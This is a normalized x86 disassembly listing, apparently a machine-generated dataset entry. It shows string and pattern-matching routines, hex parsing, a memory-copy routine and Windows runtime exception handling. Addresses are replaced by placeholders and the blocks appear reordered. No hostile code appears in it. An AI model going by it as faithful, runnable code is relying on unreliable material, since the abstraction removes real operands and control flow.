pop ebp
push ecx
call ebp
cmp eax 0x1
mov ecx [ rw-data ]
jne r-xdata
mov dl [ esi + 0x1 ]
cmp dl [ ecx ]
jne r-xdata
mov al [ esi + 0x2 ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ rw-data ]
mov al [ esi ]
cmp al [ ecx ]
jne r-xdata
mov cl [ esi + 0x2 ]
test cl cl
je r-xdata
mov dl [ esi ]
cmp dl [ edi ]
jne r-xdata
xor edx edx
mov dl [ esi + 0x3 ]
push edx
call ebp
cmp eax 0x1
jne r-xdata
mov dl [ edi ]
xor ecx ecx
cmp al dl
sete cl
mov eax ecx
test dl dl
je r-xdata
movsx eax [ edi ]
movsx edx [ esi ]
cmp eax edx
jb r-xdata
xor eax eax
inc esi
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
movsx ecx [ edi ]
movsx eax [ esi ]
cmp ecx eax
jb r-xdata
test eax eax
jne r-xdata
mov eax 0x1
lea ebx [ esp + 0x14 ]
mov ecx esi
call sub_4b4190
lea edx [ esp + 0x14 ]
push edi
push edx
mov esi eax
call sub_4b4e10
add esp 0x8
jmp r-xdata
xor eax eax
add esi 0x2
jmp r-xdata
movsx ecx cl
cmp eax ecx
ja r-xdata
inc esi
mov eax 0x1
inc esi
jmp r-xdata
xor eax eax
add esi 0x4
jmp r-xdata
movsx eax [ edi + 0x1 ]
movsx edx [ esi + 0x1 ]
cmp eax edx
jb r-xdata
mov cl [ esi ]
test cl cl
jne r-xdata
mov eax 0x1
add esi 0x2
jmp r-xdata
movsx edx [ esi + 0x3 ]
cmp ecx edx
ja r-xdata
movsx ecx [ esi + 0x4 ]
cmp eax ecx
ja r-xdata
mov eax 0x1
add esi 0x4
jmp r-xdata
sub_4b4f70
mov ecx [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
mov eax [ eax ]
push ebp
push esi
mov esi [ eax + ecx * 4 ]
test esi esi
push edi
je r-xdata
cmp [ eax + 0x18 ] 0x1
mov eax [ esp + 0x10 ]
jne r-xdata
xor eax eax
mov edi [ esp + 0x1c ]
mov ebp 0x1
pop ebx
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov al [ edi ]
test al al
je r-xdata
mov eax [ esi ]
sub eax 0x6
je r-xdata
cmp cl 0xd
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx + 0x18 ] ebp
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
cmp cl 0xa
je r-xdata
cmp [ esi + 0x8 ] 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push eax
call [ IsDBCSLeadByte@IAT ]
cmp eax ebp
mov eax [ esi ]
jne r-xdata
cmp al 0xd
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0xc ]
push edi
push edx
push ebx
call sub_4b4f70
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
cmp eax 0x3
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp al 0xa
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
xor eax eax
mov al [ edi ]
push eax
call [ IsDBCSLeadByte@IAT ]
cmp eax ebp
jne r-xdata
mov eax [ esi + 0xc ]
push edi
push eax
jmp r-xdata
mov edx [ esi + 0x4 ]
mov [ eax + edx * 8 ] edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] ebp
jne r-xdata
mov eax [ esi + 0x4 ]
push edi
push eax
call sub_4b4e10
add esp 0x8
cmp eax ebp
jne r-xdata
mov dl [ esi + 0x4 ]
cmp dl [ edi ]
jne r-xdata
mov edx [ esi + 0x4 ]
push edi
push edx
call sub_4b4e10
add esp 0x8
cmp eax ebp
jne r-xdata
mov ecx [ ebx ]
mov [ ecx + 0x14 ] ebp
inc edi
add edi 0x2
jmp r-xdata
push ebx
call sub_4b4f70
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ eax + ecx * 8 + 0x4 ] edi
mov eax [ esi + 0xc ]
push edi
push eax
jmp r-xdata
mov dl [ esi + 0x4 ]
cmp dl [ edi ]
mov al [ esi + 0x4 ]
cmp al 0x41
jl r-xdata
mov edx [ esi + 0xc ]
lea ecx [ edi + 0x1 ]
push ecx
push edx
jmp r-xdata
mov al [ esi + 0x5 ]
cmp al [ edi + 0x1 ]
jne r-xdata
lea eax [ edi + 0x2 ]
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ edi ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
lea eax [ edi + 0x1 ]
movsx ecx al
cmp al 0x5a
jg r-xdata
mov edx [ esi + 0xc ]
lea ecx [ edi + 0x2 ]
push ecx
push edx
jmp r-xdata
mov ecx [ esi + 0xc ]
push eax
push ecx
movsx eax al
cmp ecx eax
jmp r-xdata
cmp al 0x5a
jg r-xdata
movsx ecx al
add ecx 0x20
jmp r-xdata
jne r-xdata
movsx eax al
add eax 0x20
cmp ecx eax
jmp r-xdata
mov al [ edi ]
cmp al 0x41
jl r-xdata
sub_4b5150
sub esp 0xc
push ebx
mov ebx [ esp + 0x14 ]
xor eax eax
test ebx ebx
je r-xdata
pop ebx
add esp 0xc
retn
mov edx [ ebx + 0x10 ]
mov ecx [ esp + 0x20 ]
mov [ esp + 0x4 ] eax
push esi
mov [ esp + 0xc ] eax
shl edx 0x3
push edi
mov [ esp + 0x14 ] eax
push edx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x18 ] ecx
call j_sub_4b66db
mov esi [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
mov al [ esi ]
add esp 0x4
test al al
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call sub_4b4130
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
lea esp [ esp ]
mov edx [ esp + 0x10 ]
mov [ edx ] esi
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x10 ]
pop edi
mov [ edx ] eax
mov eax [ ebx + 0x10 ]
pop esi
cmp [ ebx + 0x14 ] 0x1
jne r-xdata
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ecx [ ebx + 0x10 ]
mov edi [ esp + 0x10 ]
shl ecx 0x3
mov edx ecx
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
push esi
[ edi ]
lea eax [ esp + 0x10 ]
push 0x0
push eax
call sub_4b4f70
add esp 0xc
test eax eax
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
lea ebx [ ebx ]
inc esi
jmp r-xdata
cmp al 0xa
jne r-xdata
cmp al 0xa
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
cmp al 0xd
je r-xdata
sub_4b5240
push ecx
push esi
push edi
mov esi eax
call sub_4b4810
mov edi eax
mov eax [ esi + 0x4 ]
add eax 0xfffffffd
cmp eax 0x8
ja r-xdata
mov eax edi
pop edi
pop esi
pop ecx
retn
push ebx
push ebp
jmp [ eax * 4 + jump_table_4b54ec ]
push 0x0
push edi
push 0x7
push esi
call sub_4b46e0
mov edi eax
add esp 0x10
mov eax esi
call sub_4b4380
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
pop ecx
retn
push 0x0
push edi
push 0x8
push esi
call sub_4b46e0
mov edi eax
add esp 0x10
mov eax esi
call sub_4b4380
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
pop ecx
retn
push edi
push esi
call sub_4b4710
push 0x0
push eax
push 0x7
jmp r-xdata
push edi
push esi
call sub_4b4710
push 0x0
push eax
push 0x8
push edi
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
push eax
push 0x5
push esi
call sub_4b46e0
mov edi eax
add esp 0x10
mov eax esi
call sub_4b4380
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
pop ecx
retn
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
push eax
push edi
push 0x5
push esi
call sub_4b46e0
mov edi eax
add esp 0x20
mov eax esi
call sub_4b4380
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
pop ecx
retn
mov eax [ esi + 0x114 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x114 ]
test eax eax
jne r-xdata
pop ebp
pop ebx
push esi
call sub_4b46e0
push eax
push edi
push 0x4
push esi
call sub_4b46e0
mov edi eax
add esp 0x28
mov eax esi
call sub_4b4380
pop ebp
pop ebx
mov eax edi
pop edi
pop esi
pop ecx
retn
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
push edi
push esi
call sub_4b4710
push 0x0
push eax
push 0x7
push esi
call sub_4b46e0
add esp 0x18
jmp r-xdata
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
push edi
push esi
call sub_4b4710
push 0x0
push eax
push 0x8
push esi
call sub_4b46e0
add esp 0x18
jmp r-xdata
mov ebp [ esi + 0x110 ]
test ebp ebp
jle r-xdata
push edi
push esi
call sub_4b4710
add esp 0x8
push eax
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
push eax
push 0x5
push esi
call sub_4b46e0
push eax
push ebx
push 0x4
push esi
call sub_4b46e0
add esp 0x20
mov ebx eax
mov eax [ esi + 0x110 ]
dec ebp
cmp ebp eax
jg r-xdata
mov ebp [ esi + 0x114 ]
mov ebx eax
cmp ebp [ esi + 0x110 ]
jle r-xdata
mov ebp [ esi + 0x110 ]
test ebp ebp
jle r-xdata
push edi
push esi
call sub_4b4710
push 0x0
push 0x0
push 0x9
push esi
mov [ esp + 0x28 ] eax
call sub_4b46e0
push eax
mov eax [ esp + 0x2c ]
push eax
push 0x5
push esi
call sub_4b46e0
push eax
push ebx
push 0x4
push esi
call sub_4b46e0
add esp 0x38
mov ebx eax
mov eax [ esi + 0x110 ]
dec ebp
cmp ebp eax
jg r-xdata
mov ebp [ esi + 0x114 ]
mov ebx eax
cmp ebp [ esi + 0x110 ]
jle r-xdata
mov eax [ esi + 0x110 ]
test eax eax
jne r-xdata
mov edi edi
mov eax [ esi + 0x110 ]
test eax eax
jne r-xdata
push edi
push esi
call sub_4b4710
push ebx
push eax
push 0x4
push esi
call sub_4b46e0
add esp 0x18
dec ebp
mov ebx eax
jne r-xdata
push edi
call sub_4b4990
add esp 0x4
mov eax esi
mov edi ebx
call sub_4b4380
push ebx
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
push eax
push 0x5
push esi
call sub_4b46e0
add esp 0x10
jmp r-xdata
push edi
push esi
call sub_4b4710
push ebx
push eax
push 0x4
push esi
call sub_4b46e0
add esp 0x18
dec ebp
mov ebx eax
jne r-xdata
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
push eax
push ebx
push 0x5
push esi
call sub_4b46e0
add esp 0x20
mov ebx eax
sub_4b5510
mov eax [ esi + 0x4 ]
cmp eax 0x11
je r-xdata
push 0x0
push 0x0
push 0x9
push esi
call sub_4b46e0
add esp 0x10
retn
cmp eax 0x2
je r-xdata
cmp eax 0x14
je r-xdata
push edi
mov eax esi
call sub_4b5240
mov edi eax
mov eax [ esi + 0x4 ]
cmp eax 0x11
je r-xdata
mov eax edi
pop edi
retn
cmp eax 0x2
je r-xdata
cmp eax 0x14
je r-xdata
mov eax esi
call sub_4b5240
push eax
push edi
push 0x4
push esi
call sub_4b46e0
mov edi eax
mov eax [ esi + 0x4 ]
add esp 0x10
cmp eax 0x11
jne r-xdata
sub_4b5570
push esi
mov esi [ esp + 0x8 ]
push edi
call sub_4b5510
mov edi eax
cmp [ esi + 0x4 ] 0x11
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax esi
call sub_4b4380
push edi
call sub_4b5510
push eax
push 0x5
push esi
call sub_4b46e0
mov edi eax
mov eax [ esi + 0x4 ]
add esp 0x10
cmp eax 0x11
je r-xdata
sub_4b55b0
push esi
push 0x11c
call sub_4b4120
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0xc ] eax
mov eax esi
call sub_4b4380
push esi
call sub_4b5570
mov [ esi ] eax
add esp 0x4
mov eax esi
pop esi
retn
pop esi
retn
sub_4b55f0
push ecx
mov eax [ esp + 0x8 ]
push esi
push edi
push eax
call sub_4b55b0
mov edi eax
mov [ esp + 0xc ] eax
call sub_4b4d30
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push edx
mov esi eax
call sub_4b4990
lea eax [ esp + 0x10 ]
push eax
call sub_4b4130
add esp 0xc
pop edi
mov eax esi
pop esi
pop ecx
retn
sub_4b5630
mov edx [ esp + 0x8 ]
test edx edx
mov eax [ esp + 0xc ]
push esi
mov esi eax
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
test eax eax
jle r-xdata
mov eax [ esp + 0x8 ]
test esi esi
mov [ eax ] 0x0
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
test cl cl
jne r-xdata
pop esi
retn
dec eax
pop esi
retn
dec esi
je r-xdata
sub_4b5670
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov al [ ecx ]
push ebx
mov bl [ edx ]
push esi
xor esi esi
cmp al bl
push edi
mov edi [ esp + 0x18 ]
jne r-xdata
cmp esi edi
lea esp [ esp ]
movsx eax [ ecx ]
movsx ecx [ edx ]
sub eax ecx
retn
xor eax eax
retn
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
jne r-xdata
mov al [ ecx + 0x1 ]
mov bl [ edx + 0x1 ]
inc esi
inc ecx
inc edx
cmp al bl
je r-xdata
test al al
je r-xdata
sub_4b56c0
mov edx [ esp + 0x4 ]
mov cl [ edx ]
xor eax eax
test cl cl
je r-xdata
retn
lea esp [ esp ]
cmp cl 0x41
jl r-xdata
cmp cl 0x39
jg r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x46
jg r-xdata
movsx ecx cl
sub ecx 0x30
jmp r-xdata
cmp cl 0x66
jg r-xdata
movsx ecx cl
sub ecx 0x37
jmp r-xdata
shl eax 0x4
add eax ecx
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
movsx ecx cl
sub ecx 0x57
cmp cl 0x30
jl r-xdata
sub_4b573e
push esi
mov esi [ esp + 0x8 ]
jmp r-xdata
push esi
call sub_4b66db
test eax eax
pop ecx
je r-xdata
push esi
call sub_4b6e9a
test eax eax
pop ecx
jne r-xdata
pop esi
retn
call sub_4b5826
sub_4b5762
mov eax sub_4c2163
call sub_4b7290
sub esp 0x44
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4024d0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_402340
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_4b5bd2
int3
sub_4b57a2
mov eax sub_4c2163
call sub_4b7290
sub esp 0x44
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4024d0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_402340
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_4b5bd2
int3
sub_4b5826
push ebp
mov ebp esp
sub esp 0x10
test [ rw-data ] 0x1
push esi
mov esi r--data
jne r-xdata
push rw-data
lea ecx [ ebp - 0x10 ]
call sub_4b60ac
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_4b5bd2
int3
or [ rw-data ] 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] r--data
call sub_4b606f
push sub_4c38b0
mov [ rw-data ] esi
call sub_4b6619
pop ecx
sub_4b5890
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4b58f0 ]
jmp [ ecx * 4 + jump_table_4b5970 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b59dc ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4b59dc ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4b5b78 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4b5a7c ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b5b78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b59dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b59dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b59dc ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4b5b78 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b5b78 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b5b78 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b5b78 ]
sub_4b5bd2
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_4b5c0c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_4b5c43
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4b5c95
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b7ade
add esp 0x20
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4b5ccb
cld
mov eax [ esp + 0x8 ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ esp + 0x20 ]
push [ eax + 0xc ]
push [ esp + 0x20 ]
call sub_4b7ade
add esp 0x20
retn
sub_4b5cef
push ebp
mov ebp esp
push ebx
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_4b7ade
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4b5c43
pop ebx
pop ebp
retn
sub_4b5d60
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_4b7bb5
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
lea eax [ ebx + eax * 4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_4b7bb5
pop edi
lea eax [ esi + esi * 4 ]
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_4b5e02
call sub_4b7c13
mov eax [ eax + 0x84 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_4b5e23
push esi
call sub_4b7c13
mov esi [ esp + 0x8 ]
cmp esi [ eax + 0x84 ]
jne r-xdata
call sub_4b7c13
mov eax [ eax + 0x84 ]
jmp r-xdata
call sub_4b7c13
mov ecx [ esi + 0x4 ]
mov [ eax + 0x84 ] ecx
pop esi
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
jmp sub_4b7bb5
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
pop esi
retn
mov eax ecx
sub_4b5e6f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x10 ] sub_4b5ccb
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_4b7e60
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_4b5ec0
push ebp
mov ebp esp
sub esp 0x34
push ebx
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4b5cef
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4b7c13
call [ eax + 0x74 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
